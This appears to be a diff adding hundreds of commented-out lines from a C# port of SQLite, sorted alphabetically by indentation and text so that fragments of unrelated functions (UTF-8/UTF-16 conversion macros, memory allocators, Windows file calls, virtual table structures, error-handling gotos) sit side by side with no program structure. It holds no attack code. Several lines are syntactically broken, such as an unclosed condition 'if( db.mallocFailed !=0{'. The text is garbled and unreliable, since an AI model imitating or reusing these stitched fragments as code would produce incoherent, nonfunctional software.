+//      Major Version"
+//      Minor Version 
+//      Revision
+//      UNUSED_PARAMETER( pVfs );
+//      break;
+//      c = (c<<6) + (0x3f & *(zIn++));                      \
+//      db.errCode = rc;
+//      flags = !!flags;                 /* flags = (flags ? 1 : 0); */
+//      for(pIdx=pTab.pIndex; pIdx; pIdx=pIdx.pNext){
+//      ft = System.DateTime.UtcNow.ToFileTime();
+//      goto blob_open_out;
+//      goto delmaster_out;
+//      if ( acc.mallocFailed != 0 )
+//      if ( c )
+//      if ( db.mallocFailed != 0 ) goto drop_trigger_cleanup;
+//      if ( db.mallocFailed != 0 ) goto exit_begin_add_column;
+//      if ( db.mallocFailed != 0 ) goto no_mem;
+//      if ( db.mallocFailed != 0 ) goto select_end;
+//      if ( db.mallocFailed != 0 ) goto trigger_cleanup;
+//      if ( db.mallocFailed != 0 ) return;
+//      if ( rc != SQLITE_OK )
+//      if( n<=db.lookaside.sz ){
+//      if( null==pNew ){
+//      if( pNew ){
+//      if( pNew ==null){
+//      if( pParse->zErrMsg ){
+//      if( sParse.zErrMsg ){
+//      int c;
+//      int flags = ( SQLITE_OPEN_READONLY | SQLITE_OPEN_MAIN_JOURNAL );
+//      memcpy(
+//      nAttempt++;
+//      p.mallocFailed = 1;
+//      p.nAlloc = (int)szNew;
+//      p.pStmt = null;
+//      p.tooBig = 1;
+//      p.zText = zNew;
+//      pTab = 0;
+//      public u8 mallocFailed;              /* True if we have seen a malloc failure */
+//      rc = SQLITE_ERROR;
+//      rc = sqlite3_finalize((sqlite3_stmt *)v);
+//      return aff;
+//      return pNew;
+//      return rc;
+//      return;
+//      sqlite3BtreeLeaveAll(db);
+//      sqlite3OsClose( pJournal );
+//      sqlite3PageFree(ref hit);
+//      sqlite3ParserARG_STORE;
+//      sqlite3ParserARG_STORE; /* Suppress warning about unused %extra_argument var */
+//      sqlite3ParserARG_STORE; /* Suppress warning about unused %extra_argument variable */
+//      sqlite3StrAccumReset( p );
+//      sqlite3VdbeFinalize(v);
+//      sqlite3_result_error_nomem( context );
+//      sqlite3_result_error_nomem(context);
+//      sqlite3_result_error_toobig(context);
+//      string zEnd = pType.z.Substring(pType.n);
+//      timeW = ( ( (sqlite3_int64)ft.dwHighDateTime ) * max32BitValue ) + (sqlite3_int64)ft.dwLowDateTime;
+//      v = 0;
+//      v.rc = rc;
+//      va_list ap;
+//      while( zEnd>zCol && (*zEnd==';' || sqlite3Isspace(*zEnd)) ){
+//      while( zIn!=zEnd ){
+//      yymsp[0] = yypParser.yystack[yypParser.yyidx];
+//      {
+//      || ( c & 0xFFFFF800 ) == 0xD800
+//      || ( c & 0xFFFFFFFE ) == 0xFFFE ) { c = 0xFFFD; }
+//      || sqlite3PagerIswriteable(pPage.pDbPage) );
+//      }
+//     && wrote>0
+//     /* All other windows platforms expect GetProcAddress() to take
+//     FreeLibrary((HANDLE)pHandle);
+//     amt>0
+//     if( sqlite3_diskfull_pending == 1 ){ \
+//     int iColumn;              /* Column number */
+//     int iColumn;              /* Column on left-hand side of constraint */
+//     int iTermOffset;          /* Used internally - xBestIndex should ignore */
+//     nMaxCells*sizeof(u8*)                       /* apCell */
+//     ref dwDummy );
+//     sizeof(*pSrc) + (nAlloc-1)*sizeof(pSrc.a[0]) );
+//     sqlite3GlobalConfig.m.xFree(p);
+//     unsigned char desc;       /* True for DESC.  False for ASC. */
+//     unsigned char op;         /* Constraint operator */
+//     unsigned char usable;     /* True if this constraint is usable */
+//     { goto no_mem; }
+//     } \
+//     }else{ \
+//    # undef isView
+//    (defined(SQLITE_ENABLE_FTS3) && defined(SQLITE_AMALGAMATION))
+//    *(void**)pp = (void*)*ppFrom;
+//    ** column in question contains text or a blob. If it contains
+//    ** column is not indexed. It is against the rules to open an
+//    ** indexed column for writing.
+//    */
+//    *p = '\0';
+//    *pnByte += nByte;
+//    *ppFrom += nByte;
+//    *zIn = *(zIn+1);
+//    *zIn++ = temp;
+//    *zOut++ = (u8)(((c>>10)&0x003F) + (((c-0x10000)>>10)&0x00C0));  \
+//    *zOut++ = (u8)((c>>8)&0x00FF);                                  \
+//    *zOut++ = (u8)(0x00D8 + (((c-0x10000)>>18)&0x03));              \
+//    *zOut++ = (u8)(0x00DC + ((c>>8)&0x03));                         \
+//    *zOut++ = (u8)(c&0x00FF);                                       \
+//    *zOut++ = (u8)(c&0xFF);                            \
+//    *zOut++ = 0x80 + (u8)((c>>12) & 0x3F);             \
+//    *zOut++ = 0x80 + (u8)((c>>6) & 0x3F);              \
+//    *zOut++ = 0x80 + (u8)(c & 0x3F);                   \
+//    *zOut++ = 0xC0 + (u8)((c>>6)&0x1F);                \
+//    *zOut++ = 0xE0 + (u8)((c>>12)&0x0F);               \
+//    *zOut++ = 0xF0 + (u8)((c>>18) & 0x07);             \
+//    /* Call either BtreeData() or BtreePutData(). If SQLITE_ABORT is
+//    /* Copy data from buffer to page (a write operation) */
+//    /* Copy data from page to buffer (a read operation) */
+//    /* Now search pTab for the exact column. */
+//    /* One of the following two instructions is replaced by an OP_Noop. */
+//    /* The row-record has been opened successfully. Check that the
+//    /* UTF-16 Big-endian -> UTF-8 */
+//    /* UTF-16 Little-endian -> UTF-8 */
+//    /* UTF-8 -> UTF-16 Big-endian */
+//    /* UTF-8 -> UTF-16 Little-endian */
+//    //}
+//    Debug.Assert( db == v.db );
+//    Debug.Assert( desiredEnc==SQLITE_UTF16BE );
+//    Debug.Assert( rc==SQLITE_NOMEM );
+//    Incrblob pBlob;
+//    Index.Length +              /* Index structure  */
+//    Mem nullMem
+//    N = p.nAlloc - p.nChar - 1;
+//    SQLITE_INT_TO_PTR(nConstraint)
+//    TESTONLY(int rc;)
+//    amt -= wrote;
+//    assertCellInfo(pCur);                                                      \
+//    break;
+//    bytesPerSector = SQLITE_DEFAULT_SECTOR_SIZE;
+//    c = ( c << 6 ) + ( 0x3f & *( zIn++ ) );
+//    c = (c2&0x03FF) + ((c&0x003F)<<10) + (((c&0x03C0)+0x0040)<<10);   \
+//    c = sqlite3Utf8Trans1[c-0xc0];                          \
+//    c2 += ((*zIn++)<<8);                                              \
+//    c2 += (*zIn++);                                                   \
+//    const char *zRelative     /* UTF-8 file name */
+//    db = p->db;
+//    db.lookaside.pFree = p;
+//    db.mallocFailed = 1;
+//    defined(SQLITE_MEMORY_SIZE)+defined(SQLITE_MMAP_HEAP_SIZE)+\
+//    defined(SQLITE_POW2_MEMORY_SIZE)==0
+//    defined(SQLITE_POW2_MEMORY_SIZE)>1
+//    else
+//    for(iCol=0; iCol < pTab.nCol; iCol++) {
+//    free(zFilename);
+//    free(zMbcsFilename);
+//    free(zMulti);
+//    free(zUtf8);
+//    free(zWideFilename);
+//    goto blob_open_out;
+//    goto delmaster_out;
+//    h = LoadLibraryA((char*)zConverted);
+//    h = LoadLibraryW((WCHAR*)zConverted);
+//    i += nPattern-1;
+//    i64 szNew = p.nChar;
+//    if ( !z )
+//    if ( *p == '\\' )
+//    if ( N <= 0 )
+//    if ( exists )
+//    if ( rc != SQLITE_OK )
+//    if ( szNew > p.mxAlloc )
+//    if ( zNew )
+//    if (p.zText)
+//    if( NEVER(rc!=SQLITE_OK) /* || db.mallocFailed !=0 */ ){
+//    if( c!=0xfffd ){
+//    if( c<0x80                                             \
+//    if( db.mallocFailed !=0{
+//    if( flags ){
+//    if( iCol==pTab.nCol ){
+//    if( null==pTab ){
+//    if( p==0 ){
+//    if( pTab && IsVirtual(pTab) ){
+//    if( pTab && pTab.pSelect ){
+//    if( pzErrMsg !=null){
+//    if( pzErrMsg ){
+//    if( rc!=SQLITE_OK ){
+//    if( rc!=SQLITE_ROW ){
+//    if( rc==SQLITE_ABORT ){
+//    if( type<12 ){
+//    if( v ){
+//    if( zErrmsg ){
+//    if( zOut==0 ){
+//    int c2 = ((*zIn++)<<8);                                           \
+//    int c2 = (*zIn++);                                                \
+//    int exists;
+//    int iPage = pCur.iPage;                                                   \
+//    int iSize = sqlite3MallocSize(p);
+//    int rc = sqlite3PagerWrite(pDbPage);
+//    j += nRep;
+//    m.z = 0;
+//    nByte += sqlite3Strlen30(pToCol->a[i].zName) + 1;
+//    nByteWInfo +
+//    nExtra                       /* Collation sequence names */
+//    nName + 1 +                  /* Index.zName      */
+//    nOut += nRep - nPattern;
+//    p = (LookasideSlot*)&( (u8*)p )[sz];
+//    p++;
+//    p.pNext = db.lookaside.pFree;
+//    p.tooBig = 1;
+//    p.zText = sqlite3DbMalloc(p.nChar + 1);
+//    pBlob.db = db;
+//    pBlob.flags = flags;
+//    pBlob.iOffset = v.apCsr[0].aOffset[iCol];
+//    pBlob.nByte = sqlite3VdbeSerialTypeLen(type);
+//    pBlob.pCsr =  v.apCsr[0].pCursor;
+//    pBlob.pStmt = (sqlite3_stmt *)v;
+//    pBuf = &((char*)pBuf)[wrote];
+//    pCur.validNKey = true;                                                       \
+//    pParse->db = db;
+//    pTm = gmtime(&t);
+//    p[0] = nByte;
+//    ppBlob = (sqlite3_blob *)pBlob;
+//    rc = SQLITE_ABORT;
+//    rc = SQLITE_ERROR;
+//    rc = SQLITE_NOMEM;
+//    rc = SQLITE_OK;
+//    rc = sqlite3SafetyOff(db);
+//    rc = sqlite3_finalize(p->pStmt);
+//    rc = sqlite3_step((sqlite3_stmt *)v);
+//    return 0;
+//    return 1;
+//    return SQLITE_ERROR;
+//    return SQLITE_FULL;
+//    return SQLITE_NOMEM;
+//    return addr;
+//    sizeof( WhereClause ) +
+//    sizeof( WhereMaskSet )
+//    sizeof( char* ) * nCol +        /* Index.azColl     */
+//    sizeof( int ) * ( nCol + 1 ) +       /* Index.aiRowEst   */
+//    sizeof( int ) * nCol +           /* Index.aiColumn   */
+//    sqlite3BtreeCacheOverflow(pBlob.pCsr);
+//    sqlite3BtreeEnterAll(db);
+//    sqlite3BtreeEnterCursor(p.pCsr);
+//    sqlite3BtreeEnterCursor(pBlob.pCsr);
+//    sqlite3BtreeLeaveAll(db);
+//    sqlite3BtreeLeaveCursor(p.pCsr);
+//    sqlite3BtreeLeaveCursor(pBlob.pCsr);
+//    sqlite3VdbeFinalize(v);
+//    sqlite3VdbeMemRelease(&m);
+//    sqlite3_free(ref p);
+//    sqlite3_free(ref pBt);
+//    sqlite3_mutex_enter(db->mutex);
+//    sqlite3_mutex_enter(mem0.mutex);
+//    sqlite3_mutex_enter(sqlite3MutexAlloc(SQLITE_MUTEX_STATIC_MASTER));
+//    sqlite3_mutex_leave(db->mutex);
+//    sqlite3_mutex_leave(mem0.mutex);
+//    sqlite3_mutex_leave(sqlite3MutexAlloc(SQLITE_MUTEX_STATIC_MASTER));
+//    sqlite3_result_error_toobig( context );
+//    static int sqlite3_current_time = 0;
+//    static int sqlite3_max_blobsize = 0;
+//    struct tm pTm;
+//    struct tm sNow;
+//    szNew += N + 1;
+//    temp = *zIn;
+//    u32 i[2];
+//    u32 type = v.apCsr[0].aType[iCol];
+//    u64 r;
+//    u8 *zOld;
+//    u8.Length * nCol +            /* Index.aSortOrder */
+//    unsigned char omit;      /* Do not code a test for this constraint */
+//    v = (Vdbe*)p->pStmt;
+//    v = a;
+//    v = sqlite3VdbeCreate(db);
+//    while( (*zIn & 0xc0)==0x80 ){ zIn++; }             \
+//    while( zIn!=zTerm && (*zIn & 0xc0)==0x80 ){            \
+//    while( zIn<zTerm ){
+//    z = 0;
+//    z = sqlite3Malloc( (int)nByte );
+//    z1[i] = (char)sqlite3Tolower( z1[i] );
+//    zEnd-- = '\0';
+//    zIn++;
+//    zJournal += ( sqlite3Strlen30( zJournal ) + 1 );
+//    zNew = sqlite3DbMalloc( p.nAlloc );
+//    zNew[n] = 0;
+//    zOld = zOut;
+//    zOut[j++] = zStr[i];
+//    {
+//    {OP_Variable, 1, 1, 1},        /* 5: Push the rowid to the stack */"
+//    }
+//    }                                                      \
+//    }else{
+//   && ( ( error = GetLastError() ) != NO_ERROR ) )
+//   ((p)->flags = ((p)->flags&~(MEM_TypeMask|MEM_Zero))|f)
+//   *(--bufpt) = cset[longvalue % (ulong)_base];
+//   + k*nOld;                                     /* Page copies (apCopy) */
+//   + nMaxCells*sizeof(u16)                       /* szCell */
+//   + pBt.pageSize                               /* aSpace1 */
+//   NULL
+//   if ( ISAUTOVACUUM )
+//   if( ((P).flags&MEM_Ephem)!=0 \
+//   if( db.u1.isInterrupted ) goto abort_due_to_interrupt;
+//   if( sqlite3_diskfull_pending ){ \
+//   sz = ROUND8(sz);
+//   {
+//   }
+//  #define MEM_Zero 0x0000
+//  #define assertCellInfo(x)
+//  #define codeTableLocks(x)
+//  #define sqlite3VdbeMemExpandBlob(x) SQLITE_OK
+//  #undef MEM_Zero
+//  $Header$
+//  (((pMem.flags & MEM_Dyn)!=0 && pMem.xDel!=null) ? 1 : 0) +
+//  ((P).aData + ((P).maskPage & get2byte((P).aData[(P).cellOffset+2*(I)])))
+//  ((pMem.flags & MEM_Ephem)!=0 ? 1 : 0) +
+//  ((pMem.flags & MEM_Static)!=0 ? 1 : 0)
+//  ((pMem.zMalloc !=null )? 1 : 0) + //&& pMem.zMalloc==pMem.z) ? 1 : 0) +
+//  (p.eState>=CURSOR_REQUIRESEEK ? \
+//  );
+//  ){
+//  **
+//  ** Added after 3.3.13
+//  ** Added for 3.4.1
+//  ** Added for 3.5.0
+//  ** Added for 3.5.8
+//  ** Added for 3.6.0
+//  ** Note: Maybe MemRelease() should be called if sqlite3SafetyOn()
+//  ** The original API set ends here.  All extensions can call any
+//  ** a library that is new enough to support that API.
+//  ** already been invalidated. Return SQLITE_ABORT in this case.
+//  ** always return an SQL NULL. This is useful because it means
+//  ** and offset cache without causing any IO.
+//  ** associated with such a value.
+//  ** blob_bytes() functions.
+//  ** by a previous call to balance_nonroot(). Its contents are
+//  ** db/table/row entry. The reason for using a vdbe program instead
+//  ** does. An OP_Column to retrieve this imaginary column will
+//  ** fails also (the if(...) statement above). But if people are
+//  ** is 2^63. */
+//  ** locking and error handling infrastructure built into the vdbe.
+//  ** now stored either on real database pages or within the
+//  ** of the APIs above provided that the pointer is not NULL.  But
+//  ** of writing code to use the b-tree layer directly is that the
+//  ** or 9223372036854775808 if negative.  Note that 9223372036854665808
+//  ** sqlite3_libversion_number() to make sure they are dealing with
+//  ** sqlite3_malloc() and pointed to by zMasterJournal.
+//  ** strings and blobs static.  And none of the elements are
+//  ** than 19 digits (thus guaranting that it is too large) */
+//  ** think that the table has one more column than it really
+//  ** to return a value. The following call releases any resources
+//  ** transaction.
+//  ** user function may have called an sqlite3_result_XXX() function
+//  ** we can invoke OP_Column to fill in the vdbe cursors type
+//  ** which closes the b-tree cursor and (possibly) commits the
+//  *************************************************************************
+//  */
+//  *ppBlob = 0;
+//  *z++ = 0;
+//  *zOut = 0;
+//  /*
+//  /* 19-digit numbers must be no larger than 9223372036854775807 if positive
+//  /* Added ??? */
+//  /* Added by 3.3.13 */
+//  /* Added by 3.4.1 */
+//  /* Added by 3.5.0 */
+//  /* Additional methods may be added in future releases */
+//  /* Append the new shared library handle to the db.aExtension array. */
+//  /* Configure the number of columns. Configure the cursor to
+//  /* Inputs */
+//  /* Load the entire master journal file into space obtained from
+//  /* Outputs */
+//  /* Request is out of range. Return a transient error. */
+//  /* The unpacked record is always constructed by the
+//  /* This VDBE program seeks a btree cursor to the identified
+//  /* trim path to just drive reference */
+//  /* zNum is empty or contains non-numeric text or is longer
+//  //Debug.Assert( db.mallocFailed != 0 );
+//  //Debug.Assert( sMem.z == sMem.zMalloc);
+//  //db.mallocFailed = 0;
+//  //sqlite3_free( db.lookaside.pStart );
+//  //sqlite3_free(zPathname);
+//  //sqlite3_free_table(ref res.azResult[1]);
+//  : 31;     /* Number of characters in this token */
+//  BtCursor pCursor                    /* Space to write cursor structure */
+//  CHAR* p = (CHAR*)zConverted;
+//  DWORD error;
+//  DbPage pDbPage             /* Page containing pPayload */
+//  Debug.Assert( ( pDest.flags & ( MEM_Blob | MEM_Str ) ) == 0 || pDest.z == sMem.z );
+//  Debug.Assert( ( pDest.flags & MEM_Dyn ) == 0 );
+//  Debug.Assert( (m.flags & MEM_Str)!=0 || db.mallocFailed !=0);
+//  Debug.Assert( (m.flags & MEM_Term)!=0 || db.mallocFailed !=0);
+//  Debug.Assert( 0==db.mallocFailed );
+//  Debug.Assert( desiredEnc==SQLITE_UTF8 );
+//  Debug.Assert( null == zName || xDel != SQLITE_DYNAMIC );
+//  Debug.Assert( p.pBt.inTransaction!=TRANS_NONE || p.pBt.nTransaction==0 ); \
+//  Debug.Assert( p.pBt.inTransaction>=p.inTrans );
+//  Debug.Assert( sMem.xDel == null );
+//  Debug.Assert( sqlite3_mutex_held(pCtx.s.db.mutex) );
+//  Debug.Assert( sz > sizeof( LookasideSlot* ) );
+//  Debug.Assert(i>=0 && i< sqlite3GlobalConfig.nScratch );
+//  Debug.Assert(mem0.nScratchFree< (u32)sqlite3GlobalConfig.nScratch );
+//  Debug.Assert(pPrior!=0 && nByte>0 );
+//  Debug.Assert(pPrior!=0 );
+//  DeleteFileW(zConverted);
+//  GetVersionEx(&sInfo);
+//  HANDLE h;
+//  Incrblob *p = (Incrblob *)pBlob;
+//  Incrblob p = (Incrblob *)pBlob;
+//  LookasideSlot* p;
+//  N -= zSpaces.Length-1;
+//  OSVERSIONINFO sInfo;
+//  PCache pToInit                /* Preallocated space for the PCache */
+//  Parse *pParse;
+//  Pgno sqlite3PagerPagenumber(DbPage*);
+//  ROUND8(pVfs.szOsFile)   +           /* The main db file */
+//  ROUND8(pcacheSize)      +           /* PCache object */
+//  ROUND8(sizeof(*pPager)) +           /* Pager structure */
+//  ROUNDDOWN8(sz);
+//  SQLITE_SKIP_UTF8( ref z );
+//  SQLITE_SKIP_UTF8( ref z);//  SQLITE_SKIP_UTF8(z);
+//  SQLITE_SKIP_UTF8( ref z2 );
+//  Savepoint *pNext;                   /* Parent savepoint (if any) */
+//  SelectDest* pDest     /* What to do with query results */
+//  TESTONLY( Pgno iLastPg = pagerPagecount(pBt); )
+//  Table *pTab;
+//  UNUSED_PARAMETER(pVfs);
+//  Vdbe *v = 0;
+//  Vdbe *v;
+//  WCHAR *zMbcsFilename;
+//  WCHAR *zTmpWide;
+//  WCHAR *zWideFilename;
+//  WCHAR zWidePath[MAX_PATH];
+//  [FieldOffset( 0 )]
+//  [FieldOffset( 12 )]
+//  [FieldOffset( 4 )]
+//  [FieldOffset( 8 )]
+//  aMem = &p->aMem[pOp->p4.i];
+//  aSpace1 = (u8*)&szCell[nMaxCells];
+//  assert( (n&0x7fffffff)==n );
+//  assert( 0==(1&SQLITE_PTR_TO_INT(pVal->z)) );
+//  assert( EIGHT_BYTE_ALIGNMENT(SQLITE_INT_TO_PTR(journalFileSize)));
+//  assert( nByte > 0 );
+//  assert( ppStmt && *ppStmt==0 );
+//  assert( ppStmt!=0 );
+//  attr = GetFileAttributesA( (char*)zConverted );
+//  break;
+//  c += ((*zIn++)<<8);                                                 \
+//  c += (*zIn++);                                                      \
+//  c = ((*zIn++)<<8);                                                  \
+//  c = (*zIn++);                                                       \
+//  c = *(zIn++);                                            \
+//  c = sqlite3Utf8Trans1[c - 0xc0];
+//  char **errmsg                              /* Error msg written here */
+//  char **pzErrMsg       /* Put error message here if not 0 */
+//  char **pzErrmsg       /* Error msg written here */
+//  char *zErr = 0;
+//  char *zErrMsg;                  /* Error message from sqlite3_mprintf() */
+//  char *zFilename;
+//  char *zFilenameMbcs;
+//  char *zFilenameUtf8;
+//  char *zMulti;
+//  char *zName8;
+//  char *zName;                        /* Savepoint name (nul-terminated) */
+//  char *zNew;
+//  char *zSql;
+//  char *zUtf8;
+//  char saveBuf[SAVE_SZ];
+//  char zEnd = zCol[pColDef.n-1];
+//  char zMbcsPath[MAX_PATH];
+//  char* z;
+//  char* zErrMsg = 0;
+//  char* zJournal;
+//  char* zMasterPtr = 0;
+//  char* zNew;
+//  columnMallocFailure(pStmt);
+//  const char * (*errmsg)(sqlite3*);
+//  const char * (*libversion)(void);
+//  const char **pzTail     /* OUT: Pointer to unused portion of zSql */
+//  const char *zName;       /* Name of this virtual file system */
+//  const char *zSourceName                /* Source database name */
+//  const char *zVfs        /* Name of VFS module to use */
+//  const sqlite3_module *pModule;  /* The module for this virtual table */
+//  const struct sqlite3_io_methods *pMethods;  /* Methods for an open file */
+//  const unsigned char * (*value_text)(sqlite3_value*);
+//  const void * (*errmsg16)(sqlite3*);
+//  const void * (*value_blob)(sqlite3_value*);
+//  const void * (*value_text16)(sqlite3_value*);
+//  const void * (*value_text16be)(sqlite3_value*);
+//  const void * (*value_text16le)(sqlite3_value*);
+//  const void **pzTail     /* OUT: Pointer to unused portion of zSql */
+//  db = p->db;
+//  db.aExtension = aHandle;
+//  db.aExtension[db.nExtension++] = handle;
+//  db.errCode = SQLITE_NOMEM;
+//  db.lookaside.bEnabled = 0;
+//  db.lookaside.bEnabled = 1;
+//  db.lookaside.bMalloced = 0;
+//  db.lookaside.bMalloced = pBuf == 0 ? 1 : 0;
+//  db.lookaside.pEnd = 0;
+//  db.lookaside.pEnd = p;
+//  db.mallocFailed = 1;
+//  db.pCollNeededArg = pCollNeededArg;
+//  db.xCollNeeded = 0;
+//  db.xCollNeeded16 = xCollNeeded16;
+//  do {
+//  double  (*value_double)(sqlite3_value*);
+//  double estimatedCost;      /* Estimated cost of using this index */
+//  else
+//  else if( c<0x00800 ){                                \
+//  else if( c<0x10000 ){                                \
+//  for ( ; *p ; p++ )
+//  for ( i = 0 ; z1[i] ; i++ )
+//  for ( i = cnt - 1 ; i >= 0 ; i-- )
+//  for ( j = 0 ; j < i ; j++ )
+//  for(i=0; i< sqlite3GlobalConfig.nScratch; i++){ mem0.aScratchFree[i] = i; }
+//  for(i=0; i<pToCol.nExpr; i++){
+//  free(p);
+//  free(zConverted);
+//  free(zTmpWide);
+//  goto append_from_error;
+//  goto balance_cleanup;
+//  goto btree_open_out;
+//  goto exit_create_index;
+//  goto exit_drop_index;
+//  goto exit_drop_table;
+//  goto moveto_finish;
+//  goto no_mem;
+//  goto opendb_out;
+//  goto select_end;
+//  goto translate_out;
+//  goto whereBeginError;
+//  i /=  sqlite3GlobalConfig.szScratch;
+//  i = (int)((u8*)p - (u8*)sqlite3GlobalConfig.pScratch);
+//  if ( !dwRet )
+//  if ( !p.useMalloc )
+//  if ( !zMasterJournal )
+//  if ( *p == '\\' )
+//  if ( 0==( a&0x80))
+//  if ( NEVER( pMem->zMalloc ) ) sqlite3VdbeMemRelease( pMem );
+//  if ( c < 0x80
+//  if ( nByte )
+//  if ( nByte > db->aLimit[SQLITE_LIMIT_LENGTH] )
+//  if ( p == null ) return null;
+//  if ( rc != SQLITE_OK ) goto delmaster_out;
+//  if (compare2pow63(new string(zNum)) < neg) return 1; else return 0;
+//  if (p.useMalloc && p.zText == p.zBase)
+//  if(  sqlite3GlobalConfig.bMemstat ){
+//  if( !db->mallocFailed ){
+//  if( &(*ppFrom)[nByte] <= pEnd ){
+//  if( (*(zIn++))>=0xc0 ){                              \
+//  if( (sqlite3_io_error_persist && sqlite3_io_error_hit) \
+//  if( aHandle==null ){
+//  if( aNew==0 ) return;
+//  if( aNew==0 ){
+//  if( b1==0xFE && b2==0xFF ){
+//  if( b1==0xFF && b2==0xFE ){
+//  if( c<0x00080 ){                                     \
+//  if( c<=0xFFFF ){                                                  \
+//  if( c>=0xD800 && c<0xE000 ){                                       \
+//  if( c>=0xc0 ){                                           \
+//  if( db.mallocFailed !=0{
+//  if( db.mallocFailed==0 ){
+//  if( db.nExtension>0 ){
+//  if( desiredEnc==SQLITE_UTF16LE ){
+//  if( eOp!=0 ){
+//  if( isNT() ){
+//  if( nByte == 0 ){
+//  if( nByte==0 ){
+//  if( nChar==0 ){
+//  if( out ){
+//  if( p !=null){
+//  if( p ){
+//  if( p==0 ) return SQLITE_MISUSE;
+//  if( pCur.info.nSize==null ){                                                   \
+//  if( pMem->enc==SQLITE_UTF16LE ){
+//  if( pMem->z && preserve && pMem->zMalloc && pMem->z!=pMem->zMalloc ){
+//  if( pParse==0 ){
+//  if( pPrior==0 ) return 0;
+//  if( pnPage ){
+//  if( pzErrMsg ){
+//  if( rc!=SQLITE_OK ){
+//  if( rc==INVALID_SET_FILE_POINTER && GetLastError()!=NO_ERROR ){
+//  if( rc==SQLITE_ROW ){
+//  if( v && (rc!=SQLITE_OK || db->mallocFailed) ){
+//  if( wtFlags & TERM_DYNAMIC ){
+//  if( z==0 ){
+//  if( zConverted==0 ){
+//  if( zFilename==0 ){
+//  if( zMbcsFilename==0 ){
+//  if( zMulti ){
+//  if( zName8 ){
+//  if( zNew ){
+//  if( zTmpWide==0 ){
+//  if( zUtf8 ){
+//  if( zWideFilename==0 ){
+//  int  (*aggregate_count)(sqlite3_context*);
+//  int  (*bind_parameter_count)(sqlite3_stmt*);
+//  int  (*changes)(sqlite3*);
+//  int  (*close)(sqlite3*);
+//  int  (*column_count)(sqlite3_stmt*pStmt);
+//  int  (*complete)(const char*sql);
+//  int  (*complete16)(const void*sql);
+//  int  (*data_count)(sqlite3_stmt*pStmt);
+//  int  (*enable_shared_cache)(int);
+//  int  (*errcode)(sqlite3*db);
+//  int  (*expired)(sqlite3_stmt*);
+//  int  (*finalize)(sqlite3_stmt*pStmt);
+//  int  (*get_autocommit)(sqlite3*);
+//  int  (*global_recover)(void);
+//  int  (*libversion_number)(void);
+//  int  (*reset)(sqlite3_stmt*pStmt);
+//  int  (*step)(sqlite3_stmt*);
+//  int  (*total_changes)(sqlite3*);
+//  int  (*value_bytes)(sqlite3_value*);
+//  int  (*value_bytes16)(sqlite3_value*);
+//  int  (*value_int)(sqlite3_value*);
+//  int  (*value_numeric_type)(sqlite3_value*);
+//  int  (*value_type)(sqlite3_value*);
+//  int (*blob_bytes)(sqlite3_blob*);
+//  int (*blob_close)(sqlite3_blob*);
+//  int (*clear_bindings)(sqlite3_stmt*);
+//  int (*mutex_try)(sqlite3_mutex*);
+//  int (*release_memory)(int);
+//  int (*sleep)(int);
+//  int (*vfs_unregister)(sqlite3_vfs*);
+//  int (*xBegin)(sqlite3_vtab *pVTab);
+//  int (*xClose)(sqlite3_file*);
+//  int (*xClose)(sqlite3_vtab_cursor*);
+//  int (*xCommit)(sqlite3_vtab *pVTab);
+//  int (*xDestroy)(sqlite3_vtab *pVTab);
+//  int (*xDeviceCharacteristics)(sqlite3_file*);
+//  int (*xDisconnect)(sqlite3_vtab *pVTab);
+//  int (*xEof)(sqlite3_vtab_cursor*);
+//  int (*xInit)(void*);
+//  int (*xInit)(void*);           /* Initialize the memory allocator */
+//  int (*xMutexEnd)(void);
+//  int (*xMutexHeld)(sqlite3_mutex *);
+//  int (*xMutexInit)(void);
+//  int (*xMutexNotheld)(sqlite3_mutex *);
+//  int (*xMutexTry)(sqlite3_mutex *);
+//  int (*xNext)(sqlite3_vtab_cursor*);
+//  int (*xPagecount)(sqlite3_pcache*);
+//  int (*xRollback)(sqlite3_vtab *pVTab);
+//  int (*xRoundup)(int);          /* Round up request size to allocation size */
+//  int (*xSectorSize)(sqlite3_file*);
+//  int (*xSize)(void*);           /* Return the size of an allocation */
+//  int (*xSync)(sqlite3_vtab *pVTab);
+//  int (*xthreadsafe)(void);
+//  int *pAutoinc               /* OUTPUT: True if column is auto-increment */
+//  int *sqlite3PagerStats(Pager*);
+//  int ;//#define IN_DECLARE_VTAB (pParse.declareVtab)
+//  int codepage = AreFileApisANSI() ? CP_ACP : CP_OEMCP;
+//  int i;
+//  int iCol;               /* Index of zColumn in row-record */
+//  int iDb;             /* The database containing the table to be locked */
+//  int iDbDest           /* The database of pDest */
+//  int iTab;            /* The root page of the table to be locked */
+//  int iVersion;
+//  int iVersion;            /* Structure version number */
+//  int idxNum;                /* Number used to identify the index */
+//  int lk;
+//  int mxPathname;          /* Maximum file pathname length */
+//  int nAttempt = 0;
+//  int nByte = (wsdAutoext.nExt+1)*sizeof(wsdAutoext.aExt[0]);
+//  int nByte;
+//  int nChar;
+//  int nConstraint;           /* Number of entries in aConstraint */
+//  int nMasterPtr = pVfs.mxPathname + 1;
+//  int nOrderBy;              /* Number of terms in the ORDER BY clause */
+//  int nRef;                       /* NO LONGER USED */
+//  int needToFreeIdxStr;      /* Free idxStr using sqlite3_free() if true */
+//  int orderByConsumed;       /* True if output is already ordered */
+//  int p4type            /* P4 operand type */
+//  int pRes
+//  int rc = SQLITE_OK;
+//  int rc;
+//  int sqlite3JournalCreate(sqlite3_file *);
+//  int sqlite3JournalSize(sqlite3_vfs *);
+//  int sqlite3MutexEnd(void);
+//  int sqlite3MutexInit(void);
+//  int sqlite3PagerIswriteable(DbPage*);
+//  int sqlite3SafetyOff(sqlite3*);
+//  int sqlite3SafetyOn(sqlite3*);
+//  int sqlite3SelectExprHeight(Select *);
+//  int sqlite3VdbeMemExpandBlob(Mem *);
+//  int szOsFile;            /* Size of subclassed sqlite3_file */
+//  int vfsFlags            /* Flags passed through to VFS open */
+//  journalFileSize * 2 +       /* The two journal files */
+//  k += strlen(zStmt[k]);
+//  longvalue = longvalue / (ulong)_base;
+//  m.db = db;
+//  mem0.aPageFree = (u32*)&((char*) sqlite3GlobalConfig.pPage)
+//  mem0.aScratchFree = (u32*)&((char*) sqlite3GlobalConfig.pScratch)
+//  mem0.aScratchFree[mem0.nScratchFree++] = i;
+//  mem0.nScratchFree =  sqlite3GlobalConfig.nScratch;
+//  n = sqlite3Strlen30(z) + 1;
+//  nByte = 0;
+//  nByte = ROUND8( nByte );
+//  nHeader-(sizeof(aJournalMagic)+20));
+//  nPathname + 1 +             /* zFilename */
+//  nPathname + 8 + 1           /* zJournal */
+//  neg = 0;
+//  neg = 1;
+//  object pNew;
+//  p = (LookasideSlot*)pStart;
+//  p = (sqlite3_int64*)pPrior;
+//  p = null;
